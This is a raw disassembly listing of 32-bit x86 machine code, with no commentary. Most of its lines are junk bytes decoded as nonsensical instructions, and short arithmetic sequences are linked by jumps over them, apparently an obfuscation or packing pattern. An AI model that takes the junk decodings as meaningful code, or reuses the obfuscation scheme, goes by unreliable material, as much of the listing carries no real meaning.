  404bdb:	pop    edx
  404bdc:	or     edi,DWORD PTR [ecx+0x107f6bfa]
  404be2:	scas   eax,DWORD PTR es:[edi]
  404be3:	or     BYTE PTR [edx+0x59],ah
  404be6:	jp     0x404b9d
  404be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404be9:	sahf   
  404bea:	fild   DWORD PTR [edi+0x3665a85b]
  404bf0:	scas   eax,DWORD PTR es:[edi]
  404bf1:	and    DWORD PTR [ecx+0x23],edx
  404bf4:	fcomp  QWORD PTR [ebp+0xf778eb]
  404bfa:	fidiv  DWORD PTR [esp+ebx*8]
  404bfd:	arpl   WORD PTR [ebx+0x1e],ax
  404c00:	pop    ecx
  404c01:	gs jno 0x404c34
  404c04:	loopne 0x404b97
  404c06:	jmp    0x404c1d
  404c08:	lods   al,BYTE PTR ds:[esi]
  404c09:	in     al,0xd8
  404c0b:	ins    BYTE PTR es:[edi],dx
  404c0c:	pop    ss
  404c0d:	ss dec esi
  404c0f:	fsub   QWORD PTR [esi-0x10473fce]
  404c15:	test   DWORD PTR [edi-0x60],edx
  404c18:	sti    
  404c19:	sahf   
  404c1a:	out    dx,eax
  404c1b:	aad    0xb8
  404c1d:	and    ebp,DWORD PTR [ecx-0x4f5ec375]
  404c23:	pop    ecx
  404c24:	mov    esi,0xb2c31820
  404c29:	xchg   ebp,eax
  404c2a:	dec    edi
  404c2b:	enter  0x7436,0x85
  404c2f:	jae    0x404c9c
  404c31:	dec    edx
  404c32:	mov    ecx,DWORD PTR [edi-0x70]
  404c35:	push   ebp
  404c36:	pop    ebx
  404c37:	sub    al,0x85
  404c39:	lds    edx,FWORD PTR [edx+ecx*4-0x4ca688b0]
  404c40:	icebp  
  404c41:	jno    0x404c8f
  404c43:	imul   esp,ebp,0x54
  404c46:	(bad)  
  404c47:	es clc 
  404c49:	sbb    DWORD PTR [esi+0xd],edx
  404c4c:	in     al,dx
  404c4d:	sbb    edx,ecx
  404c4f:	cdq    
  404c50:	in     al,dx
  404c51:	ror    DWORD PTR [ebp-0x51],0x9b
  404c55:	rol    DWORD PTR [ebx-0x5c],0x78
  404c59:	mul    dl
  404c5b:	aam    0xeb
  404c5d:	rcl    BYTE PTR [ecx-0xb],1
  404c60:	inc    eax
  404c61:	aaa    
  404c62:	mov    ss:0x233c8f52,eax
  404c68:	push   ds
  404c69:	icebp  
  404c6a:	(bad)  
  404c6b:	and    al,0x89
  404c6d:	push   ebp
  404c6e:	in     al,dx
  404c6f:	mov    edx,DWORD PTR [ebp-0xc]
  404c72:	mov    edi,DWORD PTR [ebp-0x24]
  404c75:	jmp    0x404dda
  404c7a:	or     al,BYTE PTR [ecx-0x1aa2d1be]
  404c80:	push   0xffffffbd
  404c82:	cmp    eax,ecx
  404c84:	dec    esi
  404c85:	rcl    DWORD PTR [esi+0x22],0x52
  404c89:	and    al,0xd6
  404c8b:	adc    eax,0x7f347c7c
  404c90:	jl     0x404d0e
  404c92:	mov    esp,0x19b20778
  404c97:	daa    
  404c98:	push   edx
  404c99:	add    BYTE PTR [ebp-0x7a],bl
  404c9c:	or     BYTE PTR [ecx+ebp*1+0x7e18baa],0x1f
  404ca4:	pop    es
  404ca5:	ds jle 0x404cd7
  404ca8:	jo     0x404d19
  404caa:	pushf  
  404cab:	stos   DWORD PTR es:[edi],eax
  404cac:	push   edi
  404cad:	aam    0xf9
  404caf:	cwde   
  404cb0:	and    eax,0xc12b8915
  404cb5:	add    BYTE PTR [edi-0x1419c81f],0x94
  404cbc:	in     al,0xc9
  404cbe:	arpl   di,di
  404cc0:	not    BYTE PTR [esi+0x428237f2]
  404cc6:	jp     0x404c54
  404cc8:	test   BYTE PTR [ebx],bh
  404cca:	push   esp
  404ccb:	sub    eax,0x8889359f
  404cd0:	dec    ebx
  404cd1:	enter  0xe852,0x34
  404cd5:	dec    ebp
  404cd6:	outs   dx,DWORD PTR ds:[esi]
  404cd7:	mov    edx,0xabe29853
  404cdc:	aad    0x87
  404cde:	(bad)  
  404cdf:	jle    0x404cb5
  404ce1:	sbb    bh,BYTE PTR [ecx+0x14]
  404ce4:	pop    edx
  404ce5:	mov    ds:0xe3fff380,al
  404cea:	pop    ebp
  404ceb:	out    0x4e,eax
  404ced:	mov    ebp,0xb0fa5f14
  404cf2:	xor    BYTE PTR [edi-0x45],bh
  404cf5:	jmp    0xc275:0x339932b7
  404cfc:	cli    
  404cfd:	mov    dh,0x61
  404cff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d00:	mov    ecx,0x794406a
  404d05:	mov    ch,0x61
  404d07:	add    DWORD PTR [edx-0x59c3e26e],0x18d6aef
  404d11:	addr16 sbb eax,0x33f67435
  404d17:	loop   0x404d17
  404d19:	inc    ebp
  404d1a:	adc    esp,DWORD PTR [edi+edx*8-0x757e2a43]
  404d21:	xor    DWORD PTR ds:0x25e43b43,ebp
  404d27:	sbb    al,0xb1
  404d29:	cwde   
  404d2a:	jb     0x404d64
  404d2c:	cli    
  404d2d:	in     eax,0xa1
  404d2f:	mov    eax,0xea0a3ebf
  404d34:	retf   
  404d35:	pusha  
  404d36:	adc    edi,ebx
  404d38:	push   ecx
  404d39:	push   es
  404d3a:	shr    DWORD PTR [ecx+0x71e31b69],cl
  404d40:	imul   esi,DWORD PTR [ebp+0x1a],0x1260d2fe
  404d47:	adc    BYTE PTR [ebp+0x3f12de75],bl
  404d4d:	pop    ebp
  404d4e:	mov    gs,WORD PTR [edi]
  404d50:	pop    esi
  404d51:	lods   al,BYTE PTR ds:[esi]
  404d52:	lahf   
  404d53:	movd   ebp,mm1
  404d56:	cmp    eax,0x3d0708b1
  404d5b:	pop    es
  404d5c:	xchg   DWORD PTR [ecx],ebx
  404d5e:	(bad)  
  404d5f:	dec    ebx
  404d60:	adc    DWORD PTR [esi+0x34609427],eax
  404d66:	jl     0x404d16
  404d68:	cli    
  404d69:	cld    
  404d6a:	icebp  
  404d6b:	add    DWORD PTR ds:0xe38f5bc,ebp
  404d71:	inc    edi
  404d72:	xor    ecx,ebx
  404d74:	nop
  404d75:	pop    ebp
  404d76:	cmp    cl,ah
  404d78:	ins    DWORD PTR es:[edi],dx
  404d79:	ja     0x404d4b
  404d7b:	pusha  
  404d7c:	mov    cl,0x8d
  404d7e:	push   ebx
  404d7f:	cmp    esp,DWORD PTR [eax-0x5bc73cc9]
  404d85:	xchg   BYTE PTR [esi-0x5a656bbc],cl
  404d8b:	imul   eax,DWORD PTR [edi+0x5c],0x3209c04e
  404d92:	fnsave [ebx]
  404d94:	loope  0x404d7b
  404d96:	inc    edi
  404d97:	js     0x404d36
  404d99:	sub    al,al
  404d9b:	or     ebx,DWORD PTR [esi+ebx*8]
  404d9e:	icebp  
  404d9f:	xor    eax,0xc6b90a41
  404da4:	jg     0x404d87
  404da6:	ror    BYTE PTR [eax],cl
  404da8:	xlat   BYTE PTR gs:[ebx]
  404daa:	call   0xcd1c:0x191a9d4d
  404db1:	stos   BYTE PTR es:[edi],al
  404db2:	push   DWORD PTR [esp+eax*4+0x7]
  404db6:	arpl   WORD PTR [edi+0x4c4c47e2],si
  404dbc:	mov    ebp,0x5433f44
  404dc1:	sub    al,0x2c
  404dc3:	pop    ds
  404dc4:	test   al,0x3
  404dc7:	sbb    DWORD PTR [edi-0x6b92e203],0xffffffce
  404dce:	mov    fs,WORD PTR [esi+0x1f333250]
  404dd4:	inc    BYTE PTR [edi]
  404dd6:	aad    0x8
  404dd8:	pusha  
  404dd9:	mov    WORD PTR [ebx],?
  404ddb:	rol    BYTE PTR [ebx],1
  404ddd:	ror    DWORD PTR [edi],1
  404ddf:	scas   eax,DWORD PTR es:[edi]
  404de0:	xlat   BYTE PTR ds:[ebx]
  404de1:	mov    edi,DWORD PTR [ebp-0xc]
  404de4:	xor    edi,eax
  404de6:	sub    edx,edi
  404de8:	mov    edi,DWORD PTR [ebp-0xc]
  404deb:	mov    ebx,DWORD PTR [ebp-0x14]
  404dee:	jmp    0x404f53
  404df3:	push   ebx
  404df4:	pop    ebx
  404df5:	inc    edx
  404df6:	cmp    DWORD PTR [edx-0x67],0x31957d53
  404dfd:	jb     0x404e2d
  404dff:	je     0x404db3
  404e01:	rcl    BYTE PTR [ebx+0x7c7c14ae],1
  404e07:	xor    al,0x7f
  404e09:	jl     0x404e87
  404e0b:	test   al,0x61
  404e0d:	psrlw  mm6,QWORD PTR [ecx+0x5e13bd79]
  404e14:	xor    eax,0x7f16c62f
  404e19:	in     eax,0x54
  404e1b:	pushf  
  404e1c:	and    eax,0x9ab06569
  404e21:	inc    ecx
  404e22:	mov    ebp,0xea9baa47
  404e27:	add    DWORD PTR [edi],ecx
  404e29:	ret    
  404e2a:	jno    0x404e70
  404e2c:	test   DWORD PTR [eax+0x9b00646],esp
  404e32:	adc    ecx,DWORD PTR [ecx+ecx*1-0x1e]
  404e36:	cmp    al,0xf5
  404e38:	cmc    
  404e39:	jmp    0xd329:0xb262f462
  404e40:	add    esi,DWORD PTR [esi+0x4b]
  404e43:	outs   dx,DWORD PTR ds:[esi]
  404e44:	out    0x60,eax
  404e46:	mov    dl,0x21
  404e48:	pop    ss
  404e49:	inc    ebx
  404e4a:	ins    DWORD PTR es:[edi],dx
  404e4b:	xlat   BYTE PTR ds:[ebx]
  404e4c:	shr    DWORD PTR [ebp+0x3f0c341d],cl
  404e52:	lds    esp,FWORD PTR [ebx+0x666af0b8]
  404e58:	hlt    
  404e59:	sar    BYTE PTR [edi+0x6d],1
  404e5c:	int    0xe4
  404e5e:	(bad)  
  404e5f:	dec    ebx
  404e60:	mov    ecx,DWORD PTR [ebx-0x2a]
  404e63:	xor    esi,ecx
  404e65:	jne    0x404e9e
  404e67:	pushf  
  404e68:	push   ss
  404e69:	xchg   edi,eax
  404e6a:	or     esi,edi
  404e6c:	popf   
  404e6d:	mov    edi,0xef663468
  404e72:	mov    esp,0x893ca19
  404e77:	ja     0x404ef5
  404e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e7a:	icebp  
  404e7b:	dec    ecx
  404e7c:	xchg   DWORD PTR [esi+edx*4],eax
  404e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e80:	adc    DWORD PTR [edi],esp
  404e82:	popa   
  404e83:	cmc    
  404e84:	adc    bh,al
  404e86:	and    DWORD PTR [edx],esp
  404e88:	ficom  DWORD PTR [ecx-0x27f49a8c]
  404e8e:	leave  
  404e8f:	pop    eax
  404e90:	dec    ebp
  404e91:	scas   eax,DWORD PTR es:[edi]
  404e92:	mov    eax,0x37beb3c7
  404e97:	mov    edx,0x8dc58279
  404e9c:	mov    dl,0xde
  404e9e:	adc    DWORD PTR [eax],edi
  404ea0:	std    
  404ea1:	call   0x31a0919d
  404ea6:	and    dh,bh
  404ea8:	or     BYTE PTR [esi-0x7b],ah
  404eab:	je     0x404ef2
  404ead:	push   ebx
  404eaf:	fidiv  WORD PTR [ecx]
  404eb1:	ins    DWORD PTR es:[edi],dx
  404eb2:	shl    BYTE PTR [edi-0x27],cl
  404eb5:	stc    
  404eb6:	mov    esp,0xf7c360a0
  404ebb:	push   cs
  404ebc:	sub    al,0x3d
  404ebe:	jp     0x404ee2
  404ec0:	fldenv es:[ebp+0x25]
  404ec4:	adc    DWORD PTR [eax],ebp
  404ec6:	jmp    0x404f3e
  404ec8:	mov    eax,0x80d5e6c9
  404ecd:	(bad)  
  404ece:	imul   ecx,DWORD PTR [edi+edx*2-0x45d97ef3],0xa5c53d1b
  404ed9:	jmp    FWORD PTR [ebx+edx*2-0x74]
  404edd:	add    dl,cl
  404edf:	mov    bh,0x40
  404ee1:	ror    DWORD PTR [ecx-0x49],cl
  404ee4:	fmul   QWORD PTR [ecx+0x2]
  404ee7:	aad    0xe8
  404ee9:	test   eax,0x72791048
  404eee:	retf   0x7545
  404ef1:	pop    edx
  404ef2:	inc    ebp
  404ef3:	repnz icebp 
  404ef5:	loopne 0x404f39
  404ef7:	sbb    edx,DWORD PTR [eax-0x4b]
  404efa:	or     edx,DWORD PTR [eax-0x139c5693]
  404f00:	and    esi,edx
  404f02:	jg     0x404ec5
  404f04:	and    DWORD PTR [esi+0x47],esi
  404f07:	xor    dl,ah
  404f09:	pop    eax
  404f0a:	xor    DWORD PTR [edx+0x2120c305],ebp
  404f10:	outs   dx,BYTE PTR ds:[esi]
  404f11:	dec    edx
  404f12:	in     al,dx
  404f13:	push   eax
  404f14:	inc    ecx
  404f15:	xor    cl,ch
  404f17:	inc    esi
  404f18:	test   bl,ch
  404f1a:	fistp  QWORD PTR [ecx-0x15b8af81]
  404f20:	jg     0x404ec6
  404f22:	aaa    
  404f23:	std    
  404f24:	out    0xb3,al
  404f26:	cmp    BYTE PTR [esi-0x4e6acdc],0x80
  404f2d:	repnz dec edi
  404f2f:	aad    0x4a
  404f31:	inc    edx
  404f32:	sub    al,0xfe
  404f34:	pop    esi
  404f35:	push   ebp
  404f36:	pop    eax
  404f37:	cmp    eax,ebx
  404f39:	push   esp
  404f3a:	jge    0x404eed
  404f3c:	push   edx
  404f3d:	call   0xea59:0x40ccb460
  404f44:	inc    esp
  404f45:	fsub   QWORD PTR [ebp-0x13]
  404f48:	ins    DWORD PTR es:[edi],dx
  404f49:	scas   al,BYTE PTR es:[edi]
  404f4a:	xchg   esp,eax
  404f4b:	sbb    BYTE PTR [esi-0x3f],0x6e
  404f4f:	(bad)  
  404f51:	sbb    BYTE PTR [edi],dh
  404f53:	xor    edi,eax
  404f55:	add    edi,ecx
  404f57:	imul   edi,ebx
  404f5a:	mov    ebx,DWORD PTR [ebp-0x18]
  404f5d:	xor    ebx,eax
  404f5f:	sub    edx,ecx
  404f61:	lea    edi,[edi+ebx*1+0x32729e]
  404f68:	cmp    edi,edx
  404f6a:	jbe    0x4047d5
  404f70:	mov    edx,DWORD PTR [ebp-0xc]
  404f73:	mov    edi,DWORD PTR [ebp-0x24]
  404f76:	xor    edx,eax
  404f78:	add    edx,ecx
  404f7a:	imul   edx,edi
  404f7d:	mov    edi,DWORD PTR [ebp-0x18]
  404f80:	xor    edi,eax
  404f82:	add    edx,edi
  404f84:	mov    edi,DWORD PTR [ebp-0x8]
  404f87:	lea    edx,[edx+edi*1+0x32729e]
  404f8e:	mov    DWORD PTR [ebp-0x8],edx
  404f91:	jmp    0x4050f6
  404f96:	jecxz  0x404f49
  404f98:	out    0xe3,eax
  404f9a:	jge    0x405019
  404f9c:	sti    
  404f9d:	mov    cl,0x66
  404f9f:	pop    edx
  404fa0:	cmp    BYTE PTR ds:0xc613f277,cl
  404fa6:	popw   ss
  404fa8:	jl     0x405026
  404faa:	xor    al,0x7f
  404fac:	jl     0x40502a
  404fae:	sub    eax,0xd1a0a889
  404fb3:	je     0x404f53
  404fb5:	nop
  404fb6:	cmp    al,0x3c
  404fb8:	retfw  0x9bf8
  404fbc:	stc    
  404fbd:	pop    edi
  404fbe:	jae    0x40503c
  404fc0:	test   dl,0x87
  404fc3:	in     eax,0x46
  404fc5:	xor    al,0xd1
  404fc7:	lods   al,BYTE PTR ds:[esi]
  404fc8:	jb     0x40503f
  404fca:	out    0x51,al
  404fcc:	mov    ss,WORD PTR [ecx+0x3c]
  404fcf:	push   ebp
  404fd0:	jecxz  0x404f9a
  404fd2:	jb     0x40500b
  404fd4:	fwait
  404fd5:	into   
  404fd6:	push   ecx
  404fd7:	lea    eax,[esi+ecx*8-0x7fe7bb54]
  404fde:	aam    0xd5
  404fe0:	jno    0x405001
  404fe2:	imul   ebp,DWORD PTR [esp+eax*8-0x355ee084],0xfffffff0
  404fea:	pop    esp
  404feb:	add    eax,0x1a111326
  404ff0:	lahf   
  404ff1:	loopne 0x404fac
  404ff3:	push   eax
  404ff4:	lods   al,BYTE PTR ds:[esi]
  404ff5:	push   0x2ff0911b
  404ffa:	mov    esp,0xe8ae6bb5
  404fff:	icebp  
  405000:	popf   
  405001:	add    BYTE PTR [edi],bh
  405003:	popa   
  405004:	jl     0x40501b
  405006:	inc    ecx
  405007:	and    DWORD PTR [edi+0x7906f127],eax
  40500d:	jmp    0x8280:0xeef4bf4f
  405014:	jae    0x40502e
  405016:	jno    0x405021
  405018:	in     al,0xfd
  40501a:	loop   0x405069
  40501c:	int3   
  40501d:	js     0x405076
  40501f:	jae    0x405049
  405021:	into   
  405022:	sub    DWORD PTR [edx+0x61],esp
  405025:	sbb    DWORD PTR [eax-0x6d],ebx
  405028:	jle    0x40501f
  40502a:	pop    esi
  40502b:	call   DWORD PTR [eax]
  40502d:	stos   DWORD PTR es:[edi],eax
  40502e:	push   esi
  40502f:	stos   BYTE PTR es:[edi],al
  405030:	or     al,0x13
  405032:	ret    0xab98
  405035:	pushf  
  405036:	push   0x66
  405038:	sbb    DWORD PTR [ecx-0x14],esi
  40503b:	push   ds
  40503c:	mov    al,ds:0x2da77b97
  405041:	jmp    0x40505a
  405043:	scas   al,BYTE PTR es:[edi]
  405044:	pop    esp
  405045:	pop    ecx
  405046:	ret    0x45d3
  405049:	(bad)  
  40504a:	aad    0xb1
  40504c:	mov    bh,0x68
  40504e:	ss inc edx
  405050:	icebp  
  405051:	sub    al,BYTE PTR [ecx+0x7d]
  405054:	mov    eax,ds:0x7310f2de
  405059:	ret    0x7085
  40505c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40505d:	cmp    al,dl
  40505f:	test   eax,0xf11be250
  405064:	xor    dh,BYTE PTR [ebx]
  405066:	mov    ebp,0x44b3eac1
  40506b:	or     DWORD PTR [eax-0xc],0x5cdf1a50
  405072:	cmp    al,0xc2
  405074:	adc    al,BYTE PTR [esp+0x6f0f18f2]
  40507b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40507c:	(bad)  
  40507d:	cli    
  40507e:	sub    edi,esi
  405080:	cmp    BYTE PTR ss:[edi],al
  405083:	bound  edi,QWORD PTR [ebx+0x0]
  405086:	hlt    
  405087:	inc    ebx
  405088:	sub    BYTE PTR [edx],bh
  40508a:	pop    edx
  40508c:	pop    edx
  40508d:	in     eax,dx
  40508e:	push   esp
  40508f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405090:	xchg   ebx,eax
  405091:	cmp    DWORD PTR [ebp+0x772f576a],esi
  405097:	dec    ebp
  405098:	lahf   
  405099:	loop   0x405091
  40509b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40509d:	mov    ss,WORD PTR [ecx]
  40509f:	inc    ebx
  4050a0:	mov    edx,eax
  4050a2:	mov    dh,0xed
  4050a4:	fldpi  
  4050a6:	ss ret 0x84bb
  4050aa:	push   ecx
  4050ab:	es mov dh,0x71
  4050af:	jne    0x405114
  4050b1:	cwde   
  4050b2:	mov    al,ds:0xb3aa8210
  4050b7:	data16 mov bh,0x48
  4050ba:	test   DWORD PTR [edx+esi*4+0xfb3def1],esp
  4050c1:	xor    DWORD PTR [edx-0x6954a451],edx
  4050c7:	jno    0x405130
  4050c9:	test   BYTE PTR [ecx-0x7a],al
  4050cc:	sub    al,0x13
  4050ce:	aaa    
  4050cf:	fwait
  4050d0:	add    al,0x2d
  4050d2:	fcom   QWORD PTR [edx]
  4050d4:	xor    DWORD PTR [eax+esi*4+0x6f09d77e],ecx
  4050db:	pop    eax
  4050dd:	mov    ebp,0xf4416b51
  4050e2:	push   ecx
  4050e3:	jo     0x405160
  4050e5:	push   ebp
  4050e6:	in     al,0x16
  4050e8:	outs   dx,DWORD PTR ds:[esi]
  4050e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ea:	sub    BYTE PTR [ecx+0x3239476e],cl
  4050f0:	out    dx,al
  4050f1:	dec    si
  4050f3:	ret    
  4050f4:	pop    ebx
  4050f5:	and    ecx,DWORD PTR [ebx-0x2fcc1fab]
  4050fb:	mov    edi,0xffcd8d62
  405100:	sub    edi,edx
  405102:	add    edi,DWORD PTR [ebp-0x10]
  405105:	mov    edx,DWORD PTR [ebp-0x20]
  405108:	mov    ebx,DWORD PTR [ebp-0x8]
  40510b:	xor    edx,eax
  40510d:	add    edx,ecx
  40510f:	imul   edx,ebx
  405112:	cmp    edx,edi
  405114:	jbe    0x4038c9
  40511a:	pop    ebx
  40511b:	pop    edi
  40511c:	leave  
  40511d:	ret    0x8
  405120:	push   ebp
  405121:	mov    ebp,esp
  405123:	push   ecx
  405124:	adc    DWORD PTR ds:0x41074f,ebx
  40512a:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  405131:	and    DWORD PTR ds:0x4489a0,0x0
  40513b:	jmp    0x40514d
  405140:	mov    edx,DWORD PTR ds:0x4489a0
  405146:	inc    edx
  405147:	mov    DWORD PTR ds:0x4489a0,edx
  40514d:	cmp    DWORD PTR ds:0x4489a0,0x10
  405154:	jae    0x40518d
  40515a:	cmp    DWORD PTR ds:0x4489a0,0x18
  405161:	jne    0x40517b
  405167:	push   DWORD PTR [ebp-0x10]
  40516a:	push   DWORD PTR [ebp-0x14]
  40516d:	push   0x410939
  405172:	push   DWORD PTR [ebp-0x10]
  405175:	call   DWORD PTR ds:0x443010
  40517b:	jmp    0x405140
  405180:	movzx  edx,BYTE PTR ds:0x44b6e4
  405187:	adc    DWORD PTR ds:0x42483c,edx
  40518d:	mov    eax,DWORD PTR [ebp-0x4]
  405190:	adc    edx,ecx
  405192:	jmp    0x4052a5
  405197:	shr    DWORD PTR [ebp+0x4e7dfe7d],cl
  40519d:	sti    
  40519e:	ins    DWORD PTR es:[edi],dx
  40519f:	fs jne 0x40519a
  4051a2:	push   edi
  4051a3:	sub    ebp,DWORD PTR [esi-0xd]
  4051a6:	add    DWORD PTR [esi],edi
  4051a8:	sub    DWORD PTR [esp+edi*2+0x62],edi
  4051ac:	jl     0x40522a
  4051ae:	jl     0x40522f
  4051b0:	rcl    DWORD PTR [edx+0x28b2ae72],cl
  4051b6:	and    ebx,DWORD PTR [esi+0x73be7cd]
  4051bc:	retf   0x4464
  4051bf:	daa    
  4051c0:	xor    eax,0x2bafb33b
  4051c5:	jne    0x405184
  4051c7:	pop    esp
  4051c8:	out    0xdf,al
  4051ca:	dec    edx
  4051cb:	mov    esp,0xd43ea988
  4051d0:	pushf  
  4051d1:	mov    ?,ecx
  4051d3:	mov    ch,0xd9
  4051d5:	mov    DWORD PTR [edi],edx
  4051d7:	iret   
  4051d8:	fwait
  4051d9:	mov    ebx,cs
  4051db:	xor    eax,0x8ef13132
  4051e0:	push   0xa6deb2d1
  4051e5:	sub    BYTE PTR [ebp+0x3],0xc1
  4051e9:	mov    al,ds:0x2d966f11
  4051ee:	xchg   BYTE PTR [edx+0x2a],bh
  4051f1:	adc    eax,0x8f2ac741
  4051f6:	out    0x25,eax
  4051f8:	mov    DWORD PTR [ebx-0x1b],ecx
  4051fb:	xchg   edi,eax
  4051fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051fd:	add    BYTE PTR [edi+0x24],al
  405200:	mov    ds:0x713520d0,al
  405205:	mov    ebx,0xc688d10
  40520a:	fldcw  WORD PTR [ebp+0x5ef8a68c]
  405210:	fwait
  405211:	sub    eax,ebp
  405213:	jp     0x4051bc
  405215:	xchg   ecx,eax
  405216:	adc    DWORD PTR [ecx-0x79],edi
  405219:	adc    dl,ch
  40521b:	xor    eax,0xdb950b64
  405220:	jmp    0x40520c
  405222:	add    al,0xf5
  405224:	cs push ecx
  405226:	outs   dx,BYTE PTR ds:[esi]
  405227:	stos   BYTE PTR es:[edi],al
  405228:	push   ebx
  405229:	outs   dx,BYTE PTR ds:[esi]
  40522a:	pusha  
  40522b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40522c:	adc    eax,0xdb57e406
  405231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405232:	mov    ch,0x6f
  405234:	or     DWORD PTR [eax+0x6616a97e],edx
  40523a:	inc    esp
  40523b:	jmp    0x4052b1
  40523d:	jnp    0x405225
  40523f:	push   edx
  405240:	enter  0xb98e,0x26
  405244:	arpl   WORD PTR [ecx],dx
  405246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405247:	push   es
  405248:	inc    esp
  405249:	test   al,0xbf
  40524b:	enter  0x46af,0xf
  40524f:	dec    ebx
  405250:	out    0x43,al
  405252:	xchg   esp,eax
  405253:	fadd   DWORD PTR [edi+ecx*8-0x8ff9e10]
  40525a:	leave  
  40525b:	ret    
  40525c:	call   FWORD PTR [ecx]
  40525e:	das    
  40525f:	xchg   ebp,eax
  405260:	scas   eax,DWORD PTR es:[edi]
  405261:	mov    esp,0xbe6aa43f
  405266:	jb     0x405268
  405268:	cwde   
  405269:	mov    edi,0x15a88574
  40526e:	daa    
  40526f:	add    edi,ecx
  405271:	adc    al,dl
  405273:	in     eax,dx
  405274:	jns    0x4052bc
  405276:	fld    DWORD PTR [ebx+0x25]
  405279:	int    0xbe
  40527b:	test   eax,0xd0bc872d
  405280:	ret    
  405281:	mov    cl,0x72
  405283:	lds    ax,DWORD PTR [ecx+0x1c059056]
  40528a:	xor    dh,bh
  40528c:	test   al,0xf5
  40528e:	sub    DWORD PTR [edx+esi*8-0x10d46805],0x3f
  405296:	ins    DWORD PTR es:[edi],dx
  405297:	pushf  
  405298:	ds mov bh,0xf0
  40529b:	ret    0xfc5b
  40529e:	mov    eax,0xe30e6aac
  4052a3:	jp     0x4052b1
  4052a5:	mov    edx,DWORD PTR [ebp+0x10]
  4052a8:	jmp    0x4053bb
  4052ad:	shl    ecx,0xe4
  4052b0:	xchg   edi,eax
  4052b1:	fs jns 0x4052f5
  4052b4:	jns    0x4052eb
  4052b6:	adc    al,0x56
  4052b8:	jne    0x4052c4
  4052ba:	les    edi,FWORD PTR [eax+0x7c28247c]
  4052c0:	jl     0x405324
  4052c2:	jl     0x405340
  4052c4:	jl     0x40532a
  4052c6:	mov    ah,0x98
  4052c8:	(bad)  
  4052c9:	loopne 0x4052bd
  4052cb:	(bad)  
  4052cc:	in     eax,dx
  4052cd:	mov    al,ds:0x572d52a8
  4052d2:	adc    dl,bh
  4052d4:	aad    0xe6
  4052d6:	xor    al,0x34
  4052d8:	mov    ch,0xc4
  4052da:	fistp  WORD PTR [esi+0x6e4e0154]
  4052e0:	hlt    
  4052e1:	or     ebp,eax
  4052e3:	repz mov esp,0xe11b8c0f
  4052e9:	and    DWORD PTR ds:0xd987f00a,edi
  4052ef:	fdivr  st,st(0)
  4052f1:	rcr    DWORD PTR ds:0xa4d41faf,0xa7
  4052f8:	push   ecx
  4052f9:	xchg   esp,eax
  4052fa:	jecxz  0x4052b9
  4052fc:	into   
  4052fd:	cdq    
  4052fe:	dec    ebp
  4052ff:	adc    eax,0x8ef18979
  405304:	jle    0x40533c
  405306:	daa    
  405307:	push   ebp
  405308:	xchg   esp,eax
  405309:	leave  
  40530a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40530b:	in     eax,dx
  40530c:	jnp    0x40537b
  40530e:	fcmovu st,st(2)
  405310:	stos   BYTE PTR es:[edi],al
  405311:	in     al,dx
  405312:	repz cld 
  405314:	or     esp,DWORD PTR ds:0x1e5970d
  40531a:	iret   
  40531b:	jne    0x405308
  40531d:	pop    edi
  40531e:	mov    esi,DWORD PTR [eax-0x720995cd]
  405324:	mov    DWORD PTR [eax+esi*2+0x3c8a3e72],eax
  40532b:	mov    al,0x2a
  40532d:	in     al,dx
  40532e:	mov    al,0x5d
  405330:	shr    DWORD PTR [eax],cl
  405332:	in     al,dx
  405333:	cwde   
  405334:	or     ah,BYTE PTR [esi+0x492d58d0]
  40533a:	xchg   edx,eax
  40533b:	pop    edi
  40533c:	pop    ebp
  40533d:	test   DWORD PTR [edx+esi*8],esi
  405340:	jno    0x40530d
  405342:	mov    edi,DWORD PTR [edx+0x63318a58]
  405348:	jle    0x405325
  40534a:	push   ebx
  40534b:	xchg   ebp,eax
  40534c:	test   BYTE PTR [ecx],dh
  40534e:	sahf   
  40534f:	xchg   ebp,eax
  405350:	(bad)  
  405351:	cs push ecx
  405353:	mov    ds:0xb842b90f,al
  405358:	xor    BYTE PTR [ebx],0xe8
  40535b:	inc    esi
  40535c:	(bad)  
  40535d:	cwde   
  40535e:	int    0x7f
  405360:	sbb    dh,BYTE PTR [edi-0x6d]
  405363:	cmc    
  405364:	sbb    al,0x45
  405366:	push   ecx
  405367:	loop   0x405304
  405369:	add    eax,0x1a08df83
  40536e:	mov    esi,ss
  405370:	push   0x1b
  405372:	into   
  405373:	mov    ?,WORD PTR [edi-0x4b]
  405376:	dec    edi
  405377:	psrlq  mm4,QWORD PTR [edx]
  40537a:	fstp   TBYTE PTR [ebp-0x411537ee]
  405380:	icebp  
  405381:	and    eax,0x42e958b8
  405386:	push   cs
  405387:	lds    ecx,FWORD PTR [edi+ebx*1]
  40538a:	repz sbb al,0x1d
  40538d:	rep ins BYTE PTR es:[edi],dx
  40538f:	mov    esi,0x8222b37c
  405394:	imul   esp,DWORD PTR [ebx-0x4d],0x29
  405398:	ds push esi
  40539a:	xchg   ebx,eax
  40539b:	jg     0x40535d
  40539d:	stos   BYTE PTR es:[edi],al
  40539e:	dec    ecx
  40539f:	inc    ebp
  4053a0:	mov    ebx,0x9bfaf3d6
  4053a5:	mov    ebx,0xb4dff5bf
  4053aa:	inc    ebp
  4053ab:	jno    0x405374
  4053ad:	xlat   BYTE PTR ds:[ebx]
  4053ae:	jp     0x4053ea
  4053b0:	jne    0x4053b0
  4053b2:	or     BYTE PTR [ebx],ah
  4053b4:	mov    bl,BYTE PTR [ebp+0x36]
  4053b7:	sub    eax,0xb97be026
  4053bc:	push   edi
  4053bd:	or     BYTE PTR [ecx+0x7],dl
  4053c0:	xor    DWORD PTR ds:0x424844,0x5c99
  4053ca:	xor    eax,ecx
  4053cc:	add    eax,0x32729e
